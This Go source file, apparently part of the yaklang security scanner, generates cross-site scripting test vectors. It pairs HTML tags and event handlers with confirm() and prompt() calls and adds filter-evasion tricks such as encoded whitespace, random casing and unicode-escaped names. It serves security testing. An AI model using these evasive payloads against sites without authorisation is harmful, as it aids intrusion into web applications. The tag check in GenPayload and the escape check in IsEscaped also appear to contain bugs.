package xhtml

import (
	"math/rand"
	"regexp"
	"strings"
	"time"
	"unsafe"
	"yaklang.io/yaklang/common/utils"
)

var fillings = []string{"%09", "%0a", "%0d", "/+/"}
var eventHandlers = map[string][]string{"ontoggle": {"details"}, "onpointerenter": {"d3v", "details", "html", "a"},
	"onmouseover": {"a", "html", "d3v"}}
var functions = []string{"[8].find(confirm)", "confirm()", "(confirm)()", "co\u006efir\u006d()", "(prompt)``", "a=prompt,a()"}
var eFillings = []string{"%09", "%0a", "%0d", "+"}
var lFillings = []string{"", "%0dx"}
var tags = []string{"html", "d3v", "a", "details"}
var jFillings = []string{";"}

func RandSafeString(n int) string {
	return RandStrFromCharSet("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", n)
}

func RandStrFromCharSet(charSet string, n int) string {
	const (
		// 6 bits to represent a letter index
		letterIdBits = 6
		// All 1-bits as many as letterIdBits
		letterIdMask = 1<<letterIdBits - 1
		letterIdMax  = 63 / letterIdBits
	)
	//const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	var src = rand.NewSource(time.Now().UnixNano())
	b := make([]byte, n)
	// A rand.Int63() generates 63 random bits, enough for letterIdMax letters!
	for i, cache, remain := n-1, src.Int63(), letterIdMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdMax
		}
		if idx := int(cache & letterIdMask); idx < len(charSet) {
			b[i] = charSet[idx]
			i--
		}
		cache >>= letterIdBits
		remain--
	}
	return *(*string)(unsafe.Pointer(&b))
}
func IsEscaped(s string) bool {
	re, _ := regexp.Compile("\\*")

	res := re.FindAllString(s, -1)
	l := len(res)
	if l == 0 {
		return false
	} else if l%2 == 0 {
		return false
	} else if l%2 == 1 {
		return true
	} else {
		return false
	}
}

func AddElement2Set(arr *[]string, e string) {
	if !utils.StringArrayContains(*arr, e) {
		*arr = append(*arr, e)
	}
}

func MatchBetween(srcBody interface{}, start string, end string, max int) (int, string) {
	src := utils.InterfaceToString(srcBody)
	srcFIndex := src
	n1 := strings.Index(srcFIndex, start)
	if n1 == -1 {
		return -1, ""
	}
	n1 += len(start)
	n2 := strings.Index(srcFIndex[n1:], end)
	if n2 == -1 {
		return -1, ""
	}
	n2 += n1

	if n2-n1-1 <= max {
		return n1, src[n1:n2]
	} else {
		return -1, ""
	}
}
func RandomUpperAndLower(s string) string {
	last := _RandomUpperAndLower(s)
	for last == s {
		last = _RandomUpperAndLower(s)
	}
	return last
}
func _RandomUpperAndLower(s string) string {
	bs := []byte(s)
	for i := 0; i < len(bs); i++ {
		if bs[i] > 'a' && bs[i] < 'z' {
			if rand.Intn(2) == 1 {
				bs[i] -= uint8(uint8('a') - uint8('A'))
			}
		} else if bs[i] > 'A' && bs[i] < 'Z' {
			if rand.Intn(2) == 1 {
				bs[i] += uint8(uint8('a') - uint8('A'))
			}
		}
	}
	return string(bs)
}

func GenPayload(testStr string, ends []string) []string {
	var bait string
	vectors := []string{}

	for _, tag := range tags {
		if tag == "d3v" || tag == "a" {
			bait = testStr
		} else {
			bait = ""
		}
		for eventHandlerKey, eventHandler := range eventHandlers {
			for _, handlerTag := range eventHandler {
				for _, function := range functions {
					for _, filling := range fillings {
						for _, eFilling := range eFillings {
							for _, lFilling := range lFillings {
								for _, end := range ends {
									if handlerTag == "3v" || handlerTag == "a" {
										if utils.StringArrayContains(ends, ">") {
											end = ">"
										}

										vector := "<" + RandomUpperAndLower(tag) + filling + RandomUpperAndLower(eventHandlerKey) + eFilling + "=" + eFilling + function + lFilling + end + bait
										vectors = append(vectors, vector)
									}
								}
							}
						}
					}
				}
			}
		}

	}
	return vectors
}
